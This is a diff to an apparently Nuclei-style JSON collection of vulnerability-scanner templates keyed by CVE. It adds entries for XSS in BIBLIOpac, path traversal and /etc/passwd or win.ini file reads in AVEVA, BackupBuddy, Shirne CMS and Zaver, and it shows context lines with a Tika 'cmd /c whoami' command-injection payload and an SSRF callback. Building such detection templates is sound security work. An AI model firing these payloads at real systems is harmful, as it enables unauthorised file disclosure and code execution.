@@ -6679,11 +6679,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -6977,6 +6977,21 @@
         {
           "raw": [
             "GET \\..\\..\\..\\..\\Windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-16139",
+      "info": {
+        "name": "BIBLIOsoft BIBLIOpac 2008 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/bibliopac/bin/wxis.exe/bibliopac/?IsisScript=bibliopac/bin/bibliopac.xic&db=\"><script>prompt(document.domain)</script>"
           ]
         }
       ]
@@ -10197,8 +10212,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -16840,8 +16855,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -19906,6 +19921,21 @@
       ]
     },
     {
+      "id": "CVE-2022-23854",
+      "info": {
+        "name": "AVEVA InTouch Access Anywhere Secure Gateway - Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-23881",
       "info": {
         "name": "ZZZCMS zzzphp 2.1.0 - Remote Code Execution",
@@ -20805,6 +20835,21 @@
       ]
     },
     {
+      "id": "CVE-2022-31474",
+      "info": {
+        "name": "BackupBuddy Arbitrary File Read",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-31656",
       "info": {
         "name": "VMware - Authentication Bypass",
@@ -21349,6 +21394,21 @@
       ]
     },
     {
+      "id": "CVE-2022-37299",
+      "info": {
+        "name": "Shirne CMS 1.2.0. - Path Traversal",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/static/ueditor/php/controller.php?action=proxy&remote=php://filter/convert.base64-encode/resource=/etc/passwd&maxwidth=-1&referer=test"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-38463",
       "info": {
         "name": "ServiceNow - Cross-Site Scripting",
@@ -21359,6 +21419,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-38794",
+      "info": {
+        "name": "Zaver - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../../../../../../../etc/passwd"
           ]
         }
       ]
